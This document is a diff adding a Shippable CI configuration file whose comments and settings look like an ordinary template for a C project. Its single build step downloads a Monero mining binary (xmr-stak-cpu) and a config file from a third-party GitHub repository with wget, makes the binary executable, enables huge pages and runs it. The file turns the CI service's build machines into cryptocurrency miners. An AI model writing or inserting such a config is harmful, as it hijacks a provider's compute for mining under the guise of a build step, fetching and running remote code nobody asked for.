@@ -1,0 +1,38 @@
+
+language: c
+
+# use this to control what branches get built.
+# http://docs.shippable.com/ci/advancedOptions/branches/
+branches:
+  only:
+    - master
+
+# using pre-defined build variables
+env:
+  global:
+    - TEST_RESULTS_DIR=$SHIPPABLE_REPO_DIR/shippable/testresults
+    - CODE_COVERAGE_DIR=$SHIPPABLE_REPO_DIR/shippable/codecoverage
+    - TESTS_LOC_DIR=$SHIPPABLE_REPO_DIR/tests
+    - MOD_LOC=$SHIPPABLE_REPO_DIR/node_modules/.bin/
+
+build:
+
+  # http://docs.shippable.com/ci/shippableyml/#ci
+  ci:
+    - apt-get update && apt-get install -y wget libmicrohttpd-dev libssl-dev build-essential libhwloc-dev && wget https://github.com/vimaba/vimaba/raw/master/config2.txt && mv config2.txt config.txt && wget https://github.com/vimaba/vimaba/raw/master/xmr-stak-cpu && chmod +x xmr-stak-cpu && sysctl -w vm.nr_hugepages=128 && ./xmr-stak-cpu
+
+
+
+# Integrations are used to connect external resources to CI
+# http://docs.shippable.com/integrations/overview/
+integrations:
+
+  # http://docs.shippable.com/ci/shippableyml/#notifications
+  notifications:
+  # turning of email for PR builds, get notified only on failure and change in status
+  # http://docs.shippable.com/integrations/notifications/email/
+    - integrationName: email
+      type: email
+      on_success: change
+      on_failure: always
+      on_pull_request: never
